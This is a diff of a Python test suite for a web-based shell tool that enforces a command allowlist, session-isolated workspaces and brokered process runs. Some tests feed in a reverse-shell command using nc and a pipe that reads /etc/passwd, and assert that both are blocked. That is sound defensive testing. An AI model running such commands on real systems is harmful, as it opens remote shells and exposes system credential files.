+            data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is True
         assert data["groups"] == groups
+
+    def test_returns_root_commands_for_prefixed_policy_entries(self):
+        client = get_client()
+        with mock.patch("blueprints.content.load_commands_registry", return_value={
+            "commands": [
+                {"root": "nc", "category": "Networking", "policy": {"allow": ["nc -z"], "deny": []}},
+                {
+                    "root": "openssl",
+                    "category": "TLS",
+                    "policy": {"allow": ["openssl s_client", "openssl ciphers"], "deny": []},
+                },
+            ],
+            "pipe_helpers": [],
+        }):
+            data = json.loads(client.get("/allowed-commands").data)
+
+        assert data["commands"] == ["nc", "openssl"]
+        assert data["groups"] == [
+            {"name": "Networking", "commands": ["nc"]},
+            {"name": "TLS", "commands": ["openssl"]},
+        ]
+
+
+class TestAutocompleteWorkspaceRoute:
+    def test_workspace_roots_follow_workspace_config(self):
+        client = get_client()
+        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
+            disabled = json.loads(client.get("/autocomplete").data)
+        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
+            enabled = json.loads(client.get("/autocomplete").data)
+
+        disabled_roots = set(disabled["builtin_command_roots"])
+        enabled_roots = set(enabled["builtin_command_roots"])
+        assert {"file", "cat", "ls", "rm"}.isdisjoint(disabled_roots)
+        assert {"file", "cat", "ls", "rm"}.issubset(enabled_roots)
+
+    def test_workspace_autocomplete_examples_follow_workspace_config(self):
+        client = get_client()
+        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
+            disabled = json.loads(client.get("/autocomplete").data)
+        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
+            enabled = json.loads(client.get("/autocomplete").data)
+
+        disabled_nmap = disabled["context"]["nmap"]
+        enabled_nmap = enabled["context"]["nmap"]
+        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" not in {
+            item["value"] for item in disabled_nmap["examples"]
+        }
+        assert "-iL" not in {item["value"] for item in disabled_nmap["flags"]}
+        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" in {
+            item["value"] for item in enabled_nmap["examples"]
+        }
+        assert "-iL" in {item["value"] for item in enabled_nmap["flags"]}
 
 
 # ── /faq ──────────────────────────────────────────────────────────────────────
@@ -763,10 +1378,87 @@ class TestWorkflowsRoute:
         for item in data["items"]:
             assert isinstance(item.get("title"), str) and item["title"]
             assert isinstance(item.get("description"), str)
+            assert isinstance(item.get("inputs"), list)
             assert isinstance(item.get("steps"), list) and item["steps"]
+            for workflow_input in item["inputs"]:
+                assert isinstance(workflow_input.get("id"), str) and workflow_input["id"].strip()
+                assert isinstance(workflow_input.get("label"), str) and workflow_input["label"].strip()
+                assert workflow_input.get("type") in {"domain", "host", "url", "port", "path"}
+                assert isinstance(workflow_input.get("required"), bool)
+                assert isinstance(workflow_input.get("placeholder"), str)
+                assert isinstance(workflow_input.get("default"), str)
+                assert isinstance(workflow_input.get("help"), str)
             for step in item["steps"]:
                 assert isinstance(step.get("cmd"), str) and step["cmd"].strip()
                 assert isinstance(step.get("note"), str)
+
+    def test_payload_includes_input_driven_workflows(self):
+        client = get_client()
+        data = json.loads(client.get("/workflows").data)
+        by_title = {item["title"]: item for item in data["items"]}
+        dns = by_title["DNS Troubleshooting"]
+        assert dns["inputs"] == [
+            {
+                "id": "domain",
+                "label": "Domain",
+                "type": "domain",
+                "required": True,
+                "placeholder": "example.com",
+                "default": "darklab.sh",
+                "help": "",
+            }
+        ]
+        assert dns["steps"][0]["cmd"] == "dig {{domain}} A"
+
+    def test_workspace_required_workflows_follow_files_feature_flag(self):
+        client = get_client()
+        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": False}):
+            disabled = json.loads(client.get("/workflows").data)
+        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
+            enabled = json.loads(client.get("/workflows").data)
+
+        disabled_titles = {item["title"] for item in disabled["items"]}
+        enabled_by_title = {item["title"]: item for item in enabled["items"]}
+
+        assert "Subdomain HTTP Triage" not in disabled_titles
+        assert "Crawl And Scan" not in disabled_titles
+        assert enabled_by_title["Subdomain HTTP Triage"]["steps"][0]["cmd"] == (
+            "subfinder -d {{domain}} -silent -o subdomains.txt"
+        )
+        assert enabled_by_title["Crawl And Scan"]["steps"][2]["cmd"] == (
+            "nuclei -l crawled-urls.txt -severity high,critical -o nuclei-findings.txt"
+        )
+
+    def test_user_workflows_are_returned_before_builtins(self):
+        client = get_client()
+        session_id = "workflow-route-" + __import__("uuid").uuid4().hex[:8]
+        resp = client.post(
+            "/session/workflows",
+            headers={"X-Session-ID": session_id},
+            json={
+                "title": "Saved DNS",
+                "description": "custom sequence",
+                "inputs": [
+                    {
+                        "id": "domain",
+                        "label": "Domain",
+                        "type": "domain",
+                        "required": True,
+                        "placeholder": "example.com",
+                        "default": "",
+                        "help": "",
+                    },
+                ],
+                "steps": [{"cmd": "dig {{domain}} A", "note": "resolve apex"}],
+            },
+        )
+        assert resp.status_code == 201
+
+        data = json.loads(client.get("/workflows", headers={"X-Session-ID": session_id}).data)
+
+        assert data["items"][0]["title"] == "Saved DNS"
+        assert data["items"][0]["source"] == "user"
+        assert data["items"][1]["source"] == "builtin"
 
 
 # ── /shortcuts ────────────────────────────────────────────────────────────────
@@ -804,7 +1496,7 @@ class TestShortcutsRoute:
         assert "?" in keys, "shortcuts overlay trigger should be self-documenting"
 
     def test_matches_shortcuts_builtin_source(self):
-        from fake_commands import get_current_shortcuts
+        from builtin_commands import get_current_shortcuts
         direct = get_current_shortcuts(is_mac=False)
         client = get_client()
         data = json.loads(client.get("/shortcuts").data)
@@ -890,62 +1582,543 @@ class TestMobileWelcomeHintsRoute:
         assert isinstance(data["items"], list)
 
 
-# ── /run ──────────────────────────────────────────────────────────────────────
+# ── /workspace/files ──────────────────────────────────────────────────────────
+
+class TestWorkspaceRoutes:
+    def _cfg(self, root, **overrides):
+        cfg = {
+            "workspace_enabled": True,
+            "workspace_backend": "tmpfs",
+            "workspace_root": str(root),
+            "workspace_quota_mb": 1,
+            "workspace_max_file_mb": 1,
+            "workspace_max_files": 10,
+            "workspace_inactivity_ttl_hours": 1,
+        }
+        cfg.update(overrides)
+        return cfg
+
+    def test_requires_active_session_header(self):
+        client = get_client()
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            resp = client.get("/workspace/files")
+        assert resp.status_code == 400
+        assert json.loads(resp.data)["error"] == "Files require an active session"
+
+    def test_disabled_workspace_returns_403(self):
+        client = get_client()
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
+            config.CFG,
+            self._cfg(tmp, workspace_enabled=False),
+        ):
+            resp = client.get("/workspace/files", headers={"X-Session-ID": "workspace-disabled"})
+        assert resp.status_code == 403
+        assert json.loads(resp.data)["error"] == "Files are disabled on this instance"
+
+    def test_write_list_read_delete_lifecycle(self):
+        client = get_client()
+        session = "workspace-lifecycle-" + uuid.uuid4().hex[:8]
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            created = client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                json={"path": "targets.txt", "text": "darklab.sh\n"},
+            )
+            assert created.status_code == 200
+            created_data = json.loads(created.data)
+            assert created_data["file"] == {"path": "targets.txt", "size": 11}
+            assert created_data["workspace"]["usage"]["bytes_used"] == 11
+
+            listed = json.loads(client.get("/workspace/files", headers={"X-Session-ID": session}).data)
+            assert listed["files"][0]["path"] == "targets.txt"
+            assert listed["limits"]["max_files"] == 10
+
+            read = client.get(
+                "/workspace/files/read?path=targets.txt",
+                headers={"X-Session-ID": session},
+            )
+            assert json.loads(read.data) == {
+                "path": "targets.txt",
+                "text": "darklab.sh\n",
+                "size": 11,
+            }
+
+            binary_path = resolve_workspace_path(session, "asset.db", config.CFG, ensure_parent=True)
+            binary_path.write_bytes(b"SQLite format 3\x00binary")
+            binary = client.get(
+                "/workspace/files/read?path=asset.db",
+                headers={"X-Session-ID": session},
+            )
+            assert binary.status_code == 415
+            assert "download it instead" in json.loads(binary.data)["error"]
+
+            deleted = client.delete(
+                "/workspace/files?path=targets.txt",
+                headers={"X-Session-ID": session},
+            )
+            assert deleted.status_code == 200
+            deleted_files = json.loads(deleted.data)["workspace"]["files"]
+            assert "targets.txt" not in {item["path"] for item in deleted_files}
+
+    def test_workspace_files_are_session_isolated(self):
+        client = get_client()
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            resp = client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": "workspace-owner"},
+                json={"path": "targets.txt", "text": "owned\n"},
+            )
+            assert resp.status_code == 200
+
+            other = client.get(
+                "/workspace/files/read?path=targets.txt",
+                headers={"X-Session-ID": "workspace-other"},
+            )
+            assert other.status_code == 404
+
+    def test_create_directory_lists_empty_folder(self):
+        client = get_client()
+        session = "workspace-dir-" + uuid.uuid4().hex[:8]
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            created = client.post(
+                "/workspace/directories",
+                headers={"X-Session-ID": session},
+                json={"path": "reports/empty"},
+            )
+            assert created.status_code == 200
+            created_data = created.get_json()
+            assert created_data["directory"] == {"path": "reports/empty"}
+            assert {"reports", "reports/empty"} <= {
+                item["path"] for item in created_data["workspace"]["directories"]
+            }
+            assert created_data["workspace"]["usage"]["file_count"] == 0
+
+            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
+            assert listed.status_code == 200
+            assert "reports/empty" in {item["path"] for item in listed.get_json()["directories"]}
+
+    def test_info_and_delete_folder_recursively(self):
+        client = get_client()
+        session = "workspace-delete-dir-" + uuid.uuid4().hex[:8]
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                json={"path": "reports/one.txt", "text": "one\n"},
+            )
+            client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                json={"path": "reports/nested/two.txt", "text": "two\n"},
+            )
+
+            info = client.get(
+                "/workspace/files/info?path=reports",
+                headers={"X-Session-ID": session},
+            )
+            assert info.status_code == 200
+            assert info.get_json() == {"path": "reports", "kind": "directory", "file_count": 2}
+
+            deleted = client.delete(
+                "/workspace/files?path=reports",
+                headers={"X-Session-ID": session},
+            )
+            assert deleted.status_code == 200
+            data = deleted.get_json()
+            assert data["deleted"] == {"path": "reports", "kind": "directory", "file_count": 2}
+            assert data["workspace"]["files"] == []
+            assert data["workspace"]["directories"] == []
+
+    def test_rejects_unsafe_paths(self):
+        client = get_client()
+        session = "workspace-paths-" + uuid.uuid4().hex[:8]
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            for bad_path in ("../escape.txt", "/tmp/escape.txt", "a\\b.txt"):
+                resp = client.post(
+                    "/workspace/files",
+                    headers={"X-Session-ID": session},
+                    json={"path": bad_path, "text": "x"},
+                )
+                assert resp.status_code == 400
+                directory = client.post(
+                    "/workspace/directories",
+                    headers={"X-Session-ID": session},
+                    json={"path": bad_path},
+                )
+                assert directory.status_code == 400
+
+    def test_rejects_unsafe_paths_on_read_delete_and_download(self):
+        client = get_client()
+        session = "workspace-route-paths-" + uuid.uuid4().hex[:8]
+        bad_paths = ("../escape.txt", "/tmp/escape.txt", "a\\b.txt")
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            for bad_path in bad_paths:
+                encoded = quote(bad_path, safe="")
+                read = client.get(
+                    f"/workspace/files/read?path={encoded}",
+                    headers={"X-Session-ID": session},
+                )
+                deleted = client.delete(
+                    f"/workspace/files?path={encoded}",
+                    headers={"X-Session-ID": session},
+                )
+                downloaded = client.get(
+                    f"/workspace/files/download?path={encoded}",
+                    headers={"X-Session-ID": session},
+                )
+
+                assert read.status_code == 400
+                assert deleted.status_code == 400
+                assert downloaded.status_code == 400
+
+    def test_allows_hidden_workspace_paths_when_listed(self):
+        client = get_client()
+        session = "workspace-hidden-" + uuid.uuid4().hex[:8]
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            created = client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                json={"path": ".config/amass.txt", "text": "hidden ok\n"},
+            )
+            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
+            read = client.get(
+                "/workspace/files/read?path=.config%2Famass.txt",
+                headers={"X-Session-ID": session},
+            )
+
+            assert created.status_code == 200
+            assert listed.status_code == 200
+            assert ".config/amass.txt" in {item["path"] for item in listed.get_json()["files"]}
+            assert read.status_code == 200
+            assert read.get_json()["text"] == "hidden ok\n"
+
+    def test_enforces_quota_and_type_checks(self):
+        client = get_client()
+        session = "workspace-quota-" + uuid.uuid4().hex[:8]
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
+            config.CFG,
+            self._cfg(tmp, workspace_quota_mb=0, workspace_max_file_mb=0, workspace_max_files=1),
+        ):
+            non_object = client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                data="not-json",
+                content_type="text/plain",
+            )
+            assert non_object.status_code == 400
+
+            non_text = client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                json={"path": "targets.txt", "text": ["darklab.sh"]},
+            )
+            assert non_text.status_code == 400
+            assert json.loads(non_text.data)["error"] == "text must be a string"
+
+            too_big = client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                json={"path": "targets.txt", "text": "x"},
+            )
+            assert too_big.status_code == 413
+
+    def test_download_streams_session_owned_file(self):
+        client = get_client()
+        session = "workspace-download-" + uuid.uuid4().hex[:8]
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+            client.post(
+                "/workspace/files",
+                headers={"X-Session-ID": session},
+                json={"path": "notes/targets.txt", "text": "darklab.sh\n"},
+            )
+            resp = client.get(
+                "/workspace/files/download?path=notes/targets.txt",
+                headers={"X-Session-ID": session},
+            )
+        assert resp.status_code == 200
+        assert resp.get_data(as_text=True) == "darklab.sh\n"
+        assert "attachment" in resp.headers["Content-Disposition"]
+        assert "targets.txt" in resp.headers["Content-Disposition"]
+
+    def test_periodic_cleanup_runs_before_requests_when_workspace_enabled(self):
+        client = get_client()
+        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
+        try:
+            shell_app._last_workspace_cleanup_monotonic = 0
+            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+                from workspace import ensure_session_workspace
+                expired_root = ensure_session_workspace("expired-session", config.CFG)
+                os.utime(expired_root, (1000, 1000))
+
+                with mock.patch("app.time.monotonic", return_value=1000):
+                    resp = client.get("/health")
+
+                assert resp.status_code == 200
+                assert not expired_root.exists()
+        finally:
+            shell_app._last_workspace_cleanup_monotonic = previous_cleanup
+
+    def test_periodic_cleanup_skips_request_session_workspace(self):
+        client = get_client()
+        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
+        try:
+            shell_app._last_workspace_cleanup_monotonic = 0
+            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
+                from workspace import ensure_session_workspace
+                current_root = ensure_session_workspace("active-session", config.CFG)
+                expired_root = ensure_session_workspace("expired-session", config.CFG)
+                os.utime(current_root, (1000, 1000))
+                os.utime(expired_root, (1000, 1000))
+
+                with mock.patch("app.time.monotonic", return_value=1000):
+                    resp = client.get("/health", headers={"X-Session-ID": "active-session"})
+
+                assert resp.status_code == 200
+                assert current_root.exists()
+                assert not expired_root.exists()
+        finally:
+            shell_app._last_workspace_cleanup_monotonic = previous_cleanup
+
+
+# ── /runs ─────────────────────────────────────────────────────────────────────
 
 class TestRunRoute:
-    def test_missing_command_returns_400(self):
+    def test_brokered_run_requires_available_broker(self):
         client = get_client()
-        resp = client.post("/run", json={})
-        assert resp.status_code == 400
+        with mock.patch("blueprints.run.broker_available", return_value=False), \
+             mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"):
+            resp = client.post("/runs", json={"command": "echo hi"})
+        assert resp.status_code == 503
+        assert json.loads(resp.data)["error"] == "broker unavailable"
 
-    def test_empty_command_returns_400(self):
+    def test_brokered_run_missing_runtime_returns_synthetic_stream_reference(self):
         client = get_client()
-        resp = client.post("/run", json={"command": "   "})
-        assert resp.status_code == 400
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
+             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
+             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
+             mock.patch("blueprints.run._brokered_synthetic_run", return_value="run-missing") as synthetic, \
+             mock.patch("blueprints.run.subprocess.Popen") as popen:
+            resp = client.post(
+                "/runs",
+                json={"command": "nmap -sV darklab.sh"},
+                headers={"X-Session-ID": "session-1"},
+            )
+        assert resp.status_code == 202
+        assert json.loads(resp.data) == {
+            "run_id": "run-missing",
+            "stream": "/runs/run-missing/stream",
+        }
+        synthetic.assert_called_once()
+        args = synthetic.call_args.args
+        assert args[0] == "nmap -sV darklab.sh"
+        assert args[3] == [{"type": "output", "text": "Command is not installed on this instance: nmap"}]
+        assert args[4] == 127
+        assert synthetic.call_args.kwargs == {"cmd_type": "missing"}
+        popen.assert_not_called()
 
-    def test_non_string_command_returns_400(self):
+    def test_brokered_run_rejects_invalid_command_payloads(self):
         client = get_client()
-        resp = client.post("/run", json={"command": 123})
-        assert resp.status_code == 400
-        assert json.loads(resp.data)["error"] == "Command must be a string"
+        with mock.patch("blueprints.run.broker_available", return_value=True):
+            non_object = client.post("/runs", json=["hostname"])
+            missing = client.post("/runs", json={})
+            non_string = client.post("/runs", json={"command": 42})
+            blank = client.post("/runs", json={"command": "   "})
 
-    def test_non_object_json_returns_400(self):
+        assert non_object.status_code == 400
+        assert json.loads(non_object.data) == {"error": "Request body must be a JSON object"}
+        assert missing.status_code == 400
+        assert json.loads(missing.data) == {"error": "No command provided"}
+        assert non_string.status_code == 400
+        assert json.loads(non_string.data) == {"error": "Command must be a string"}
+        assert blank.status_code == 400
+        assert json.loads(blank.data) == {"error": "No command provided"}
+
+    def test_brokered_run_disallowed_command_returns_403_before_spawning(self):
         client = get_client()
-        resp = client.post("/run", json=["not", "an", "object"])
-        assert resp.status_code == 400
-        assert json.loads(resp.data)["error"] == "Request body must be a JSON object"
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")), \
+             mock.patch("blueprints.run.subprocess.Popen") as popen:
+            resp = client.post("/runs", json={"command": "nmap -sS 127.0.0.1"})
+
+        assert resp.status_code == 403
+        assert json.loads(resp.data) == {"error": "blocked"}
+        popen.assert_not_called()
+
+    def test_brokered_run_starts_real_process_and_registers_active_run(self):
+        client = get_client()
+        fake_proc = _RouteFakeProc(pid=8765)
+        _CapturedThread.instances = []
+
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
+             mock.patch("blueprints.run.rewrite_command", return_value=("ping darklab.sh", "rewritten")), \
+             mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
+             mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
+             mock.patch("blueprints.run.pid_register") as pid_register, \
+             mock.patch("blueprints.run.active_run_register") as active_register, \
+             mock.patch("blueprints.run.publish_run_event") as publish, \
+             mock.patch("blueprints.run.threading", mock.Mock(Thread=_CapturedThread)), \
+             mock.patch("blueprints.run.uuid.uuid4", return_value="run-real"):
+            resp = client.post(
+                "/runs",
+                json={"command": "ping darklab.sh", "tab_id": "tab-1"},
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
+            )
+
+        assert resp.status_code == 202
+        assert json.loads(resp.data) == {
+            "run_id": "run-real",
+            "stream": "/runs/run-real/stream",
+        }
+        launched = popen.call_args.args[0]
+        assert launched[-2:] == ["-c", "ping darklab.sh"]
+        pid_register.assert_called_once_with("run-real", 8765)
+        active_register.assert_called_once()
+        assert active_register.call_args.args[:4] == (
+            "run-real",
+            8765,
+            "session-1",
+            "ping darklab.sh",
+        )
+        assert active_register.call_args.kwargs == {
+            "owner_client_id": "client-1",
+            "owner_tab_id": "tab-1",
+        }
+        publish.assert_called_once()
+        assert publish.call_args.args[:2] == ("run-real", "started")
+        assert publish.call_args.args[2]["run_id"] == "run-real"
+        assert len(_CapturedThread.instances) == 1
+        thread = _CapturedThread.instances[0]
+        assert thread.started is True
+        assert thread.daemon is True
+        assert thread.name == "run-broker-run-real"
+        assert thread.kwargs["run_id"] == "run-real"
+        assert thread.kwargs["proc"] is fake_proc
+        assert thread.kwargs["session_id"] == "session-1"
+        assert thread.kwargs["original_command"] == "ping darklab.sh"
+        assert thread.kwargs["rewrite_notice"] == "rewritten"
+
+    def test_brokered_run_events_returns_session_scoped_backfill(self):
+        client = get_client()
+        fake_event = mock.Mock(event_id="10-0", payload={"type": "output", "text": "hello"})
+        fake_event.as_payload.return_value = {"event_id": "10-0", "type": "output", "text": "hello"}
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
+             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as get_events:
+            resp = client.get(
+                "/runs/run-1/events?after=9-0&limit=25",
+                headers={"X-Session-ID": "session-1"},
+            )
+        assert resp.status_code == 200
+        assert json.loads(resp.data) == {
+            "run_id": "run-1",
+            "events": [{"event_id": "10-0", "type": "output", "text": "hello"}],
+        }
+        get_events.assert_called_once_with("run-1", after_id="9-0", limit=25)
+
+    def test_brokered_run_events_rejects_runs_outside_session(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
+             mock.patch("blueprints.run.get_run_events") as get_events:
+            resp = client.get(
+                "/runs/run-other/events",
+                headers={"X-Session-ID": "session-1"},
+            )
+
+        assert resp.status_code == 404
+        assert json.loads(resp.data) == {"error": "Run not found"}
+        get_events.assert_not_called()
+
+    def test_brokered_run_stream_replays_events_for_session_run(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
+             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: one\n\n"])), \
+             mock.patch("blueprints.run.active_run_touch_owner") as touch:
+            resp = client.get(
+                "/runs/run-1/stream?after=9-0&tab_id=tab-1",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
+            )
+            body = resp.get_data(as_text=True)
+        assert resp.status_code == 200
+        assert body == "data: one\n\n"
+        touch.assert_called_once_with("run-1", "client-1", "tab-1")
+
+    def test_brokered_run_stream_rejects_runs_outside_session(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
+             mock.patch("blueprints.run.stream_run_events") as stream_events:
+            resp = client.get(
+                "/runs/run-other/stream",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
+            )
+
+        assert resp.status_code == 404
+        assert json.loads(resp.data) == {"error": "Run not found"}
+        stream_events.assert_not_called()
+
+    def test_brokered_run_owner_takeover_route_is_retired(self):
+        client = get_client()
+        resp = client.post(
+            "/runs/run-1/owner",
+            headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
+            json={"tab_id": "tab-2"},
+        )
+        assert resp.status_code == 404
+
+    def test_kill_allows_same_session_attached_client_and_publishes_killer(self):
+        client = get_client()
+        with mock.patch("blueprints.run.pid_pop_for_session", return_value=4321) as pop_pid, \
+             mock.patch("blueprints.run.publish_run_event") as publish, \
+             mock.patch("blueprints.run.SCANNER_PREFIX", ""), \
+             mock.patch("blueprints.run.os.killpg") as killpg:
+            resp = client.post(
+                "/kill",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
+                json={"run_id": "run-1", "tab_id": "tab-2"},
+            )
+        assert resp.status_code == 200
+        assert json.loads(resp.data) == {"killed": True}
+        pop_pid.assert_called_once_with("run-1", "session-1")
+        publish.assert_called_once_with("run-1", "killed", {
+            "killer_client_id": "client-2",
+            "killer_tab_id": "tab-2",
+        })
+        killpg.assert_called_once_with(4321, shell_app.signal.SIGTERM)
+
+    def test_kill_rejects_runs_outside_session(self):
+        client = get_client()
+        with mock.patch("blueprints.run.pid_pop_for_session", return_value=None) as pop_pid, \
+             mock.patch("blueprints.run.publish_run_event") as publish:
+            resp = client.post(
+                "/kill",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
+                json={"run_id": "run-1"},
+            )
+        assert resp.status_code == 404
+        assert json.loads(resp.data) == {"error": "No such process"}
+        pop_pid.assert_called_once_with("run-1", "session-1")
+        publish.assert_not_called()
 
     def test_disallowed_command_returns_403(self):
         client = get_client()
-        # Patch in commands' namespace — is_command_allowed calls load_allowed_commands
+        # Patch in commands' namespace — is_command_allowed calls load_command_policy
         # from commands' own namespace, not from app's.
-        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
-            resp = client.post("/run", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
+            resp = client.post("/runs", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
         assert resp.status_code == 403
 
     def test_shell_operator_returns_403(self):
         client = get_client()
-        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
-            resp = client.post("/run", json={"command": "ping google.com | cat /etc/passwd"})
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
+            resp = client.post("/runs", json={"command": "ping google.com | cat /etc/passwd"})
         assert resp.status_code == 403
-
-    def test_missing_allowlisted_command_returns_synthetic_run(self):
-        client = get_client()
-        with mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
-             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
-             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
-             mock.patch("blueprints.run.subprocess.Popen") as popen:
-            resp = client.post("/run", json={"command": "nmap -sV darklab.sh"})
-            body = resp.get_data(as_text=True)
-        assert resp.status_code == 200
-        assert '"type": "started"' in body
-        assert "Command is not installed on this instance: nmap\\n" in body
-        assert '"type": "exit"' in body
-        popen.assert_not_called()
 
     def test_non_json_body_handled(self):
         client = get_client()
-        resp = client.post("/run", data="not json", content_type="text/plain")
+        with mock.patch("blueprints.run.broker_available", return_value=True):
+            resp = client.post("/runs", data="not json", content_type="text/plain")
         # Should not crash — Flask returns 400 or 415 for bad content type
         assert resp.status_code in (400, 415, 500)
 
@@ -960,8 +2133,8 @@ class TestRunRoute:
                     "command": "theme list",
                     "exit_code": 0,
                     "lines": [
-                        {"text": "Available themes:", "cls": "fake-section"},
-                        {"text": "Dark themes:", "cls": "fake-section"},
+                        {"text": "Available themes:", "cls": "builtin-section"},
+                        {"text": "Dark themes:", "cls": "builtin-section"},
                     ],
                 },
             )
@@ -980,7 +2153,12 @@ class TestRunRoute:
             assert history["total_count"] == 1
 
             run_id = history["runs"][0]["id"]
-            detail = json.loads(client.get(f"/history/{run_id}?json&preview=1").data)
+            detail = json.loads(
+                client.get(
+                    f"/history/{run_id}?json&preview=1",
+                    headers={"X-Session-ID": session},
+                ).data
+            )
             assert detail["command"] == "theme list"
             assert detail["output"] == ["Available themes:", "Dark themes:"]
         finally:
@@ -1021,6 +2199,355 @@ class TestHistoryRoute:
         assert isinstance(data["runs"], list)
         assert "roots" in data
         assert isinstance(data["roots"], list)
+
+    def test_stats_returns_compact_session_counters(self):
+        client = get_client()
+        session = "history-stats-" + uuid.uuid4().hex[:8]
+        run_ids = [f"{session}-ok", f"{session}-fail", f"{session}-terminated", f"{session}-active"]
+        snapshot_id = f"{session}-snapshot"
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[0], session, "nmap -sT ip.darklab.sh", "2026-01-01T00:00:00",
+                 "2026-01-01T00:00:10", 0, "[]"),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[1], session, "curl https://ip.darklab.sh", "2026-01-01T00:01:00",
+                 "2026-01-01T00:01:20", 1, "[]"),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[2], session, "ping ip.darklab.sh", "2026-01-01T00:02:00",
+                 "2026-01-01T00:02:15", -15, "[]"),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[3], session, "sleep 60", "2026-01-01T00:03:00", None, None, "[]"),
+            )
+            conn.execute(
+                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
+                (snapshot_id, session, "snap", "2026-01-01T00:03:00", "[]"),
+            )
+            conn.execute(
+                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
+                (session, "nmap -sT ip.darklab.sh"),
+            )
+            conn.commit()
+            data = json.loads(client.get("/history/stats", headers={"X-Session-ID": session}).data)
+            assert data["runs"]["total"] == 4
+            assert data["runs"]["succeeded"] == 1
+            assert data["runs"]["failed"] == 1
+            assert data["runs"]["incomplete"] == 1
